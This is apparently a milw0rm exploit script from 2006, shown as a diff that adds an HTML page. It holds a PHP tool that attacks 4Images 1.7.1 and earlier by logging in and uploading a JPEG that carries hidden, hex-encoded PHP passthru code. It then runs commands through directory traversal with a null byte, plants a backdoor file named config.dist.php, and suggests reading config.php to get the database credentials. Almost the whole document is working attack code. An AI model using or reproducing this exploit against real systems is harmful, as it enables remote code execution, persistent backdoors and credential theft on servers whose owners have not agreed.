@@ -1,0 +1,414 @@
+<html><head><title>4Images <= 1.7.1 (Local Inclusion) Remote Code Execution Exploit</title></head><pre>&lt;?php
+#  ----4images_171_incl_xpl.php                              6.45 26/02/2006   #
+#                                                                              #
+#  4Images &lt;= 1.7.1 remote commands execution through arbitrary local          #
+#  inclusion                                                                   #
+#                              coded by rgod                                   #
+#                    site: http://retrogod.altervista.org                      #
+#                                                                              #
+#  -&gt; this works regardless of magic_quotes_gpc settings                       #
+#                                                                              #
+# Sun-Tzu: &quot;Having doomed spies, doing certain things openly for purposes of   #
+# deception, and allowing our spies to know  of them and report them to  the   #
+# enemy.&quot;                                                                      #
+
+/* short explaination:
+   directory traversal in &quot;template&quot; argument, ex:
+
+   http://[target]/[path]/index.php?template=../../../../../../../etc/passwd%00
+
+   this exploit uploads a .jpg file with maliciuos EXIF metadata comptempt,
+   it will be evaluated as php code:
+
+   http://[target]/[path]/index.php?template=../../data/tmp_media/suntzu1293.jpg%00
+   or
+   http://[target]/[path]/index.php?template=../../data/media/1/suntzu1293.jpg%00
+
+   also, it installs a backdoor on target server, called &quot;config.dist.php&quot;,
+   then...
+
+   http://[target]/[path]/config.dist.php?cmd=cat%20config.php
+ 								              */
+error_reporting(0);
+ini_set(&quot;max_execution_time&quot;,0);
+ini_set(&quot;default_socket_timeout&quot;,5);
+ob_implicit_flush (1);
+
+echo'&lt;html&gt;&lt;head&gt;&lt;title&gt;****** 4Images &lt;= 1.7.1 remote commands execution ******
+&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;
+&lt;style type=&quot;text/css&quot;&gt; body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
+#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
+{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
+!important} option {  background-color:   #303030   !important}         textarea
+{background-color: #303030 !important} input {color: #1CB081 !important}  option
+{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
+{background-color: #303030 !important} select {font-weight: normal;       color:
+#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
+background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
+0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
+!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
+!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
+!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
+normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
+{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
+color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
+font-weight:bold; font-style: italic;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;Stile6&quot;&gt;
+****** 4Images &lt;= 1.7.1 remote commands execution ****** &lt;/p&gt;&lt;p class=&quot;Stile6&quot;&gt;a
+script  by  rgod  at    &lt;a href=&quot;http://retrogod.altervista.org&quot;target=&quot;_blank&quot;&gt;
+http://retrogod.altervista.org&lt;/a&gt;&lt;/p&gt;&lt;table width=&quot;84%&quot;&gt;&lt;tr&gt;&lt;td    width=&quot;43%&quot;&gt;
+&lt;form name=&quot;form1&quot; method=&quot;post&quot;   action=&quot;'.$_SERVER[PHP_SELF].'&quot;&gt;    &lt;p&gt;&lt;input
+type=&quot;text&quot;  name=&quot;host&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;* target    (ex:www.sitename.com)
+&lt;/span&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;path&quot;&gt;  &lt;span class=&quot;Stile5&quot;&gt;* path (ex:
+/4images/ or just / ) &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;cmd&quot;&gt;         &lt;span
+class=&quot;Stile5&quot;&gt; * specify a command (&quot;cat config.php&quot; to see database username &amp;
+password...)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot;   name=&quot;USER&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;
+a valid USER ...&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;password&quot; name=&quot;PASS&quot;&gt;          &lt;span
+class=&quot;Stile5&quot;&gt; ... and PASSWORD, required for STEP 2 and following...   &lt;/span&gt;
+&lt;/p&gt;  &lt;p&gt; &lt;input   type=&quot;text&quot; name=&quot;port&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;specify  a  port
+other than  80 (default value) &lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot;    name=&quot;proxy&quot;&gt;
+&lt;span class=&quot;Stile5&quot;&gt;send  exploit through an HTTP proxy (ip:port)&lt;/span&gt;&lt;/p&gt;&lt;p&gt;
+&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;go!&quot;&gt; &lt;/p&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;
+&lt;/body&gt;&lt;/html&gt;';
+
+
+function show($headeri)
+{
+  $ii=0;$ji=0;$ki=0;$ci=0;
+  echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
+  while ($ii &lt;= strlen($headeri)-1){
+    $datai=dechex(ord($headeri[$ii]));
+    if ($ji==16) {
+      $ji=0;
+      $ci++;
+      echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
+      for ($li=0; $li&lt;=15; $li++) {
+        echo &quot;&lt;td&gt;&quot;.htmlentities($headeri[$li+$ki]).&quot;&lt;/td&gt;&quot;;
+		}
+      $ki=$ki+16;
+      echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
+    }
+    if (strlen($datai)==1) {
+      echo &quot;&lt;td&gt;0&quot;.htmlentities($datai).&quot;&lt;/td&gt;&quot;;
+    }
+    else {
+      echo &quot;&lt;td&gt;&quot;.htmlentities($datai).&quot;&lt;/td&gt; &quot;;
+    }
+    $ii++;$ji++;
+  }
+  for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++) {
+    echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
+  }
+  for ($li=$ci*16; $li&lt;=strlen($headeri); $li++) {
+    echo &quot;&lt;td&gt;&quot;.htmlentities($headeri[$li]).&quot;&lt;/td&gt;&quot;;
+  }
+  echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket() //2x speed
+{
+  global $proxy, $host, $port, $packet, $html, $proxy_regex;
+  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+  if ($socket &lt; 0) {
+    echo &quot;socket_create() failed: reason: &quot; . socket_strerror($socket) . &quot;&lt;br&gt;&quot;;
+  }
+  else {
+    $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {echo 'Not a valid proxy...';
+    die;
+    }
+  echo &quot;OK.&lt;br&gt;&quot;;
+  echo &quot;Attempting to connect to &quot;.$host.&quot; on port &quot;.$port.&quot;...&lt;br&gt;&quot;;
+  if ($proxy=='') {
+    $result = socket_connect($socket, $host, $port);
+  }
+  else {
+    $parts =explode(':',$proxy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
+    $result = socket_connect($socket, $parts[0],$parts[1]);
+  }
+  if ($result &lt; 0) {
+    echo &quot;socket_connect() failed.\r\nReason: (&quot;.$result.&quot;) &quot; . socket_strerror($result) . &quot;&lt;br&gt;&lt;br&gt;&quot;;
+  }
+  else {
+    echo &quot;OK.&lt;br&gt;&lt;br&gt;&quot;;
+    $html= '';
+    socket_write($socket, $packet, strlen($packet));
+    echo &quot;Reading response:&lt;br&gt;&quot;;
+    while ($out= socket_read($socket, 2048)) {$html.=$out;}
+    echo nl2br(htmlentities($html));
+    echo &quot;Closing socket...&quot;;
+    socket_close($socket);
+  }
+  }
+}
+
+function refresh()
+{
+  flush();
+  ob_flush();
+  usleep(5000000000);
+}
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.htmlentities($host); die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid prozy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...&lt;br&gt;';
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);echo nl2br(htmlentities($html));
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$_POST[host];$port=$_POST[port];$path=$_POST[path];
+$USER=$_POST[USER];$PASS=$_POST[PASS];$cmd=$_POST[cmd];$proxy=$_POST[proxy];
+
+echo &quot;&lt;span class=\&quot;Stile5\&quot;&gt;&quot;;
+
+  if (($host&lt;&gt;'') and ($path&lt;&gt;'') and ($cmd&lt;&gt;''))
+  {
+    $port=intval(trim($port));
+    if ($port=='') {$port=80;}
+    if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {die('Error... check the path!');}
+    if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+    # STEP 1 -&gt; check if backdoor already installed...
+    $packet =&quot;GET &quot;.$p.&quot;config.dist.php?cmd=&quot;.urlencode($cmd).&quot; HTTP/1.1\r\n&quot;;
+    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
+    show($packet);
+    sendpacketii($packet);
+    if (eregi(&quot;Hi Master!&quot;,$html)) {die(&quot;backdoor already installed...exploit succeeded...&lt;/span&gt;&quot;);}
+
+  }
+  echo &quot;backdoor not installed... -&gt; STEP 2...&lt;BR&gt;&quot;;
+  if (($host&lt;&gt;'') and ($path&lt;&gt;'') and ($cmd&lt;&gt;'') and ($USER&lt;&gt;'') and ($PASS&lt;&gt;''))
+  {
+
+    # STEP 2 -&gt; Login...
+    $data=&quot;user_name=&quot;.$USER.&quot;&amp;user_password=&quot;.$PASS.&quot;&amp;auto_login=1&quot;;
+    $packet =&quot;POST &quot;.$p.&quot;login.php HTTP/1.1\r\n&quot;;
+    $packet.=&quot;User-Agent: sun-tzu\r\n&quot;;
+    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+    $packet.=&quot;Accept: text/plain\r\n&quot;;
+    $packet.=&quot;Accept-Language: en\r\n&quot;;
+    $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;index.php?lang=en\r\n&quot;;
+    $packet.=&quot;Connection: Close\r\n&quot;;
+    $packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
+    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n\r\n&quot;;
+    $packet.=$data;
+    show($packet);
+    sendpacketii($packet);
+    if (!eregi(&quot;Location:&quot;,$html)) {die(&quot;Failed to login...&quot;);}
+    $temp=explode(&quot;Set-Cookie: &quot;,$html);
+    $COOKIE='';
+    for ($i=1; $i&lt;=6; $i++)
+    {
+      $temp2=explode(&quot; &quot;,$temp[$i]);
+      $COOKIE.=&quot; &quot;.$temp2[0];
+    }
+    echo &quot;COOKIE -&gt; &quot;.htmlentities($COOKIE).&quot;\r\n&quot;;
+
+    # STEP 3 -&gt; Retrieve a category to put jpeg in
+    $packet =&quot;GET &quot;.$p.&quot;index.php HTTP/1.1\r\n&quot;;
+    $packet.=&quot;User-Agent: sun-tzu\r\n&quot;;
+    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+    $packet.=&quot;Accept-Language: en\r\n&quot;;
+    $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;index.php?lang=en\r\n&quot;;
+    $packet.=&quot;Cookie:&quot;.$COOKIE.&quot;\r\n&quot;;
+    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
+    show($packet);
+    sendpacketii($packet);
+    $temp=explode(&quot;cat_id=&quot;,$html);
+    $temp2=explode(&quot;&amp;&quot;,$temp[1]);
+    $CATID=$temp2[0];
+    echo &quot;CATID -&gt; &quot;.htmlentities($CATID).&quot;\r\n&quot;;
+    if (($CATID=='') | (strlen($CATID) &gt; 3))
+    {die(&quot;Failed to retrieve a valid category to upload image in...&quot;);}
+
+    # STEP 4 -&gt; Upload evil jpg file...
+    $shell=
+    chr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x01).chr(0x3f).chr(0x3c).chr(0x3f).
+    chr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x6f).chr(0x62).chr(0x5f).
+    chr(0x63).chr(0x6c).chr(0x65).chr(0x61).chr(0x6e).chr(0x28).chr(0x29).chr(0x3b).
+    chr(0x0d).chr(0x0a).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x22).chr(0x48).
+    chr(0x69).chr(0x20).chr(0x4d).chr(0x61).chr(0x73).chr(0x74).chr(0x65).chr(0x72).
+    chr(0x21).chr(0x22).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x69).chr(0x6e).chr(0x69).
+    chr(0x5f).chr(0x73).chr(0x65).chr(0x74).chr(0x28).chr(0x22).chr(0x6d).chr(0x61).
+    chr(0x78).chr(0x5f).chr(0x65).chr(0x78).chr(0x65).chr(0x63).chr(0x75).chr(0x74).
+    chr(0x69).chr(0x6f).chr(0x6e).chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).
+    chr(0x22).chr(0x2c).chr(0x30).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x70).
+    chr(0x61).chr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).chr(0x28).
+    chr(0x24).chr(0x5f).chr(0x47).chr(0x45).chr(0x54).chr(0x5b).chr(0x22).chr(0x63).
+    chr(0x6d).chr(0x64).chr(0x22).chr(0x5d).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).
+    chr(0x24).chr(0x69).chr(0x6e).chr(0x3d).chr(0x22).chr(0x3c).chr(0x3f).chr(0x70).
+    chr(0x68).chr(0x70).chr(0x20).chr(0x6f).chr(0x62).chr(0x5f).chr(0x63).chr(0x6c).
+    chr(0x65).chr(0x61).chr(0x6e).chr(0x28).chr(0x29).chr(0x3b).chr(0x65).chr(0x63).
+    chr(0x68).chr(0x6f).chr(0x5c).chr(0x22).chr(0x48).chr(0x69).chr(0x20).chr(0x4d).
+    chr(0x61).chr(0x73).chr(0x74).chr(0x65).chr(0x72).chr(0x21).chr(0x5c).chr(0x22).
+    chr(0x3b).chr(0x69).chr(0x6e).chr(0x69).chr(0x5f).chr(0x73).chr(0x65).chr(0x74).
+    chr(0x28).chr(0x5c).chr(0x22).chr(0x6d).chr(0x61).chr(0x78).chr(0x5f).chr(0x65).
+    chr(0x78).chr(0x65).chr(0x63).chr(0x75).chr(0x74).chr(0x69).chr(0x6f).chr(0x6e).
+    chr(0x5f).chr(0x74).chr(0x69).chr(0x6d).chr(0x65).chr(0x5c).chr(0x22).chr(0x2c).
+    chr(0x30).chr(0x29).chr(0x3b).chr(0x70).chr(0x61).chr(0x73).chr(0x73).chr(0x74).
+    chr(0x68).chr(0x72).chr(0x75).chr(0x28).chr(0x5c).chr(0x24).chr(0x5f).chr(0x47).
+    chr(0x45).chr(0x54).chr(0x5b).chr(0x5c).chr(0x22).chr(0x63).chr(0x6d).chr(0x64).
+    chr(0x5c).chr(0x22).chr(0x5d).chr(0x29).chr(0x3b).chr(0x64).chr(0x69).chr(0x65).
+    chr(0x3b).chr(0x3f).chr(0x3e).chr(0x22).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x24).
+    chr(0x73).chr(0x75).chr(0x6e).chr(0x3d).chr(0x66).chr(0x6f).chr(0x70).chr(0x65).
+    chr(0x6e).chr(0x28).chr(0x22).chr(0x63).chr(0x6f).chr(0x6e).chr(0x66).chr(0x69).
+    chr(0x67).chr(0x2e).chr(0x64).chr(0x69).chr(0x73).chr(0x74).chr(0x2e).chr(0x70).
+    chr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x22).chr(0x77).chr(0x22).chr(0x29).
+    chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x70).chr(0x75).chr(0x74).chr(0x73).
+    chr(0x28).chr(0x24).chr(0x73).chr(0x75).chr(0x6e).chr(0x2c).chr(0x24).chr(0x69).
+    chr(0x6e).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x66).chr(0x63).chr(0x6c).
+    chr(0x6f).chr(0x73).chr(0x65).chr(0x28).chr(0x24).chr(0x73).chr(0x75).chr(0x6e).
+    chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x63).chr(0x68).chr(0x6d).chr(0x6f).
+    chr(0x64).chr(0x28).chr(0x22).chr(0x63).chr(0x6f).chr(0x6e).chr(0x66).chr(0x69).
+    chr(0x67).chr(0x2e).chr(0x64).chr(0x69).chr(0x73).chr(0x74).chr(0x2e).chr(0x70).
+    chr(0x68).chr(0x70).chr(0x22).chr(0x2c).chr(0x37).chr(0x37).chr(0x37).chr(0x29).
+    chr(0x3b).chr(0x0d).chr(0x0a).chr(0x64).chr(0x69).chr(0x65).chr(0x3b).chr(0x0d).
+    chr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).chr(0x4a).
+    chr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x00).
+    chr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).chr(0x00).
+    chr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
+    chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0xff).
+    chr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).chr(0x01).
+    chr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).chr(0x03).
+    chr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).chr(0x01).
+    chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+    chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x09).
+    chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).chr(0x00).
+    chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+    chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xc4).
+    chr(0x00).chr(0x14).chr(0x01).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+    chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+    chr(0x00).chr(0x00).chr(0x00).chr(0x06).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).
+    chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+    chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
+    chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).chr(0x03).chr(0x01).
+    chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).chr(0x3f).chr(0x00).
+    chr(0x3f).chr(0xc1).chr(0xc7).chr(0xdf).chr(0xff).chr(0xd9).chr(0x00);
+    srand(make_seed());
+    $v = rand(1,9999);
+    $evil=&quot;suntzu&quot;.$v.&quot;.jpg&quot;;
+    $data =&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;action\&quot;\r\n\r\n&quot;;
+    $data.=&quot;uploadimage\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;cat_id\&quot;\r\n\r\n&quot;;
+    $data.=$CATID.&quot;\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;media_file\&quot;; filename=\&quot;&quot;.$evil.&quot;\&quot;\r\n&quot;;
+    $data.=&quot;Content-Type: image/jpeg\r\n\r\n&quot;;
+    $data.=$shell.&quot;\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;remote_media_file\&quot;\r\n\r\n\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;thumb_file\&quot;; filename=\&quot;\&quot;\r\n\r\n\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;remote_thumb_file\&quot;\r\n\r\n\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;image_name\&quot;\r\n\r\n&quot;;
+    $data.=&quot;flower\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;image_description\&quot;\r\n\r\n&quot;;
+    $data.=&quot;wonderful flower\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK\r\n&quot;;
+    $data.=&quot;Content-Disposition: form-data; name=\&quot;image_keywords\&quot;\r\n\r\n&quot;;
+    $data.=&quot;flower\r\n&quot;;
+    $data.=&quot;------------lNnHj26YsSTIS0qSMhw5MK--\r\n&quot;;
+    $packet =&quot;POST &quot;.$p.&quot;member.php HTTP/1.1\r\n&quot;;
+    $packet.=&quot;User-Agent: suntzoi\r\n&quot;;
+    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+    $packet.=&quot;Accept-Language: en\r\n&quot;;
+    $packet.=&quot;Referer: http://&quot;.$host.$path.&quot;member.php?action=uploadform&amp;cat_id=&quot;.$CATID.&quot;\r\n&quot;;
+    $packet.=&quot;Connection: Close\r\n&quot;;
+    $packet.=&quot;Cookie:&quot;.$COOKIE.&quot;\r\n&quot;;
+    $packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
+    $packet.=&quot;Content-Type: multipart/form-data; boundary=----------lNnHj26YsSTIS0qSMhw5MK\r\n\r\n&quot;;
+    $packet.=$data;
+    show($packet);
+    sendpacketii($packet);
+
+    # STEP 5 -&gt; Launch commands...
+    $xpl=&quot;../../data/tmp_media/&quot;.$evil.chr(0x00);
+    $xpl=urlencode($xpl);
+    $packet =&quot;GET &quot;.$p.&quot;index.php?cmd=&quot;.urlencode($cmd).&quot;&amp;template=&quot;.$xpl.&quot; HTTP/1.1\r\n&quot;;
+    $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+    $packet.=&quot;Connection: Close\r\n\r\n&quot;;
+    show($packet);
+    sendpacketii($packet);
+    if (eregi(&quot;Hi Master!&quot;,$html)) {die(&quot;Exploit succeeded...&quot;);}
+
+    for ($subf=1; $subf&lt;=100; $subf++)
+    {
+      $xpl=&quot;../../data/media/&quot;.$subf.&quot;/&quot;.$evil.chr(0x00);
+      $xpl=urlencode($xpl);
+      $packet =&quot;GET &quot;.$p.&quot;index.php?cmd=&quot;.urlencode($cmd).&quot;&amp;template=&quot;.$xpl.&quot; HTTP/1.1\r\n&quot;;
+      $packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
+      $packet.=&quot;Connection: Close\r\n\r\n&quot;;
+      show($packet);
+      sendpacketii($packet);
+      if (eregi(&quot;Hi Master!&quot;,$html)) {die(&quot;Exploit succeeded...&quot;);}
+    }
+    //if you are here...
+    echo &quot;Exploit failed...&quot;;
+
+   }
+   else
+   {echo &quot;Fill * required fields for step 2 and followings, optionally specify a proxy...&quot;;}
+echo &quot;&lt;/span&gt;&quot;;
+?&gt;
+
+# milw0rm.com [2006-02-26]</pre></html>
